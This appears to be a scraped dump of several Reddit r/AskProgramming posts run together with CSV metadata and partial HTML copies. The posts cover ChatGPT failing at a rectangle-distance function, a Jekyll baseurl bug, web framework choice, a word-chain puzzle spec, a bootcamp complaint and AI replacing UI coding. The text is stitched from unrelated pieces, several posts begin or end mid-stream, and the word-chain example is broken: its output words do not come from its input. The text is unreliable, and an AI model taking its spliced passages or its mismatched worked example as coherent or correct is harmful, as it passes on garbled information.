2048,confidence,"Hi, while working on a programming task for my hobby project, I wanted to see whether ChatGPT can help me with writing a function.

After an hour of trying to nudge it in the right direction, I gave up and wrote the function myself (which took me about an hour as well).

I wanted to ask in this subreddit if somebody with more programming and/or chatGPT experience could have formulated the question in a way that would have returned a working code sample.

Please share your attempts, successful or not, in the comments! 

___

The problem:

I have two axis-aligned rectangles.
I need a function that returns the shortest possible line between those two rectangles.

Visually speaking, I am looking for the blue lines in this picture: https://www.cs.mcgill.ca/~fzamal/Project/maxmin.PNG

___

My attempts:

In the first attempt, I tried describing the problem in words, just like I did in this post. The resulting function worked fine for rectangles that were left/right of each other, but failed for rectangles that were above/below each other. Telling chatGPT that the function didn't work in that case, made it flip the behaviour. After telling it that it needs to work for both cases, the result was wrong in other ways.

In the second attempt I tried providing the mathematical definition of a mindist function between two rectangles from this website https://www.cs.mcgill.ca/~fzamal/Project/concepts.htm which it was able to implement correctly, but when asked to return the resulting line instead of the distance, it failed to convert the variables from the calculation process into a line format with the relevant line, usually returning a transposed line.

In my third attempt I wrote an exhaustive list of inputs and correct outputs, that cover all cases and describe how the function behaves. Still the result never worked for all cases, even after multiple corrections, the behaviour just kept flipping between which special cases it worked for.",t2_24kvozj5,False,0,False,How to make ChatGPT solve this programming task?,r/AskProgramming,False,6,,0,False,t3_112d8q4,False,dark,0.22,public,0,0,False,False,False,Other,False,0,False,False,self,0.0,self,True,1676401331.0,text,6,text,self.AskProgramming,False,"<!-- SC_OFF --><div class=""md""><p>Hi, while working on a programming task for my hobby project, I wanted to see whether ChatGPT can help me with writing a function.</p>

2048,confidence,"I was wondering if someone could help me with a Jekyll theme issue. \*\*This is for the Minima theme.\*\*

I recently just set up a GitHub Pages. Hooray! This is very exciting for me.

I've been having endless issues with inserting the baseurl for the ""post"" layout; not for anything else (e.g. default, page). I have no idea why.

Here's the setup:

    url: ""https://[user].github.io"" # the base hostname & protocol for your site, e.g. http://example.com # this means to ignore newlines until ""baseurl:"" 
    baseurl: ""/portfolio"" # the subpath of your site, e.g. /blog  

For ""page"" layout, I have the following:

    --- 
    layout: page 
    title: About 
    permalink: /about 
    ---  
    
    # About page  This page tells you a little bit about me.  

No issue - https://\[user\].github.io/portfolio/about

With a post, however, I've coded the following:

    --- 
    layout: post 
    title:  ""Space Race Project"" 
    date:   2023-02-11 17:09:05 -0500 
    categories: excel 
    permalink: /:categories/:title/ 
    ---  

And the result - http://\[user\].github.io/python/pet-sales/

Why is it excluding the baseurl, ""portfolio?"" It leads to a 404 error.

Any help would be so appreciated.

<p>I&#39;ve been having endless issues with inserting the baseurl for the &quot;post&quot; layout; not for anything else (e.g. default, page). I have no idea why.</p>

<p>Here&#39;s the setup:</p>

<pre><code>url: &quot;https://[user].github.io&quot; # the base hostname &amp; protocol for your site, e.g. http://example.com # this means to ignore newlines until &quot;baseurl:&quot; 
baseurl: &quot;/portfolio&quot; # the subpath of your site, e.g. /blog

layout: page

# About page  This page tells you a little bit about me.

<p>No issue - https://[user].github.io/portfolio/about</p>

This post has been removed by admins in Webdev... Not sure why, if you know or understand why, please let me know. 

I know HTML / CSS kinda well but Javascript experience is kinda very poor and I am not a great programmer BUT I like to learn new stuff and I finally have a project I'd like to cherish for many years to come and maintain it myself.

Basically I want to create a website with a database and I want to let users filter the database themselves on the website and add more information themselves on the site and this new information they put in can also be filtered and searched by other members.

Now the question since web dev is evolving so quickly in the recent years I don't really know where to start and which programming language / database structure would be preferable?

I want to have my hands dirty, time is not an issue and I can take the time to learn stuff instead of using a software that will do it all for me. 

According to Chat GPT here are the recommendations but since I do not have a lot of experience with these framework, I need assistance to know which one should I start with. Not sure which one is best for me and what you guys recommend and why?

* Ruby on Rails: a framework written in the Ruby programming language, known for its ability to create complex web applications quickly.
* Laravel: a PHP framework that includes an ORM (Object Relational Mapper) for database management, as well as an easy-to-use authentication system.
* Django: a Python framework that follows the Model-View-Template architectural pattern and includes a powerful ORM for database management.
* Node.js with Express: a JavaScript-based framework for building web applications, often used in  
conjunction with a NoSQL database like MongoDB.

It outputs to stdout a sequence of words, where the first letter of the next word in the sequence is equal to the last letter of the word before

Example

Input:

cherry

date

pear

Output:

banana

apple

Rules

The program must receive a list of words from standard input, one word per line.

It should return the longest sequence of words, where the next word in the sequence starts with the last letter of the previous word.

There cannot be repeated words in the sequence. Also no repeated words in the input

The string must be returned to standard output, one word per line.

The program must know how to deal with uppercase/lowercase letters. Uppercase letters are the same as lowercase letters.

The program cannot use either libraries or external services.

The program must be written in Java, C or Python.

In a nutshell, I've worked in a variety of roles that were data analytics adjacent (tools, cloud, data structures, and sql), but more on the business side than the technical side, so think strategy and planning, IT analytics, or just general tech consulting. However, I have needed to close the gap on learning real programming, especially since I'd like to keep working remote and dev work always seems to be at the top of remote opportunities. 
  

Having been laid off last year, I took a break, and then joined an immersive fullstack boot camp (thanks uncle sam and US taxpayers).  The boot camp is a well known one, but my cohort is a fucking nightmare filled with numerous set up issues, lack of preparation, shallow instruction, waving off student concerns and questions, and generally just useful for the canned content (which they hardly use but is actually decent) and the projects.  Lecture is a complete waste and it's the internet and chatgpt teaching me. Not everyone is shit at the job, but the best lecturer isn't the main one, so we don't get a ton of time with them. 
  

We have hit a point in the class where things are starting to rev up, we blazed through databases and servers at a pace that almost makes no sense. We reviewed everything from the previous weeks the week prior to the one we covered servers and databases, which covered vanilla JS, CSS, HTML, DOM, and debugging. It helped a little, but then it accelerated without any improvement in the instruction. We're covering React very soon.
  

My question is, how the f**k do I catch up and not feel so overwhelmed?   And succeed despite them?    9 out of 10 times it feels like going to class and doing group or pair work is a waste of my time.  I'd rather just work alone than potentially get stuck with a dipshit who cheated their way to our level and makes me carry all the weight or worse, teach them some shit that was their and the instructor's responsibility.

Any suggestions?  I can't drop at this point without being indebted, so I have to finish. But I feel set up for failure and having to work double the amount that other cohorts have had to (based on chats with students ahead of us).

I&#39;ve seen some of their content and their cohort instructors did a WAY better job than those teaching us now. It&#39;s pathetic how much it costs given the shit quality. And I know for certain there are many in it whole feel like me. I can&#39;t move to a new boot camp or cohort because of my timeline though.</p>

I think we've all noticed the sheer acceleration of AI technology, I think Stable Diffusion for AI generated images was released this year and not long after we already are getting versions of it that can now do animations. Honestly, I think the rate of growth is pretty scary I was not expecting to see something like this and I just sit and think about it every now and then.

That got me thinking, I know programming goes into UI and (I think) UI is essentially an image with moving parts that can be linked to databases, the internet, etc. you interact with it the same way as you would with the source code but it's pretty and clickable as to not confuse our non-coding smooth and simple brains. So just how you can prompt the SD AI to generate images with simple phrases like:

\-do a building

\-make it pointy

\-no not so pointy

\-perfect, now add Amy Winehouse swinging from a wrecking ball

Why wouldn't it be possible to do the same with coding? And I mean since it's ""just images"", couldn't the AI not even have to actually write any new code? Like say you had the Reddit website but instead of all the elements being written in code somewhere, it's just an interact-able image and when you request something, say you click on a post, instead of the website running something to get it the AI just goes and gets it and shows it to you. Why couldn't you make a website with prompts like:

\-Add some tabs titled ""shop; contact; support; Yo mama jokes""

\-Add a dark backdrop

\-Syncronize the shop items tab with the excel file ""shop items""

\-Add shopping cart

\-Add animation to buttons

And lets say that this implementation for websites would be ""easier"" since you have website building websites with pre-made elements and you could build off that (I don't know if you can I'm just saying) why couldn't this principle or idea work for other forms of coding that aren't necessarily tied to UI, say back-end related activities that I know nothing about, idk what you guys get up to back there.

I know I'm coming off as really ignorant right about now probably, tbh I'm just watching how slowly but surely my job is gonna be inevitably replaced by some devs writing some ones and zeroes in a computer and I'm just wondering if y'all are planning your own obsolescence or if you're just fucking with us.
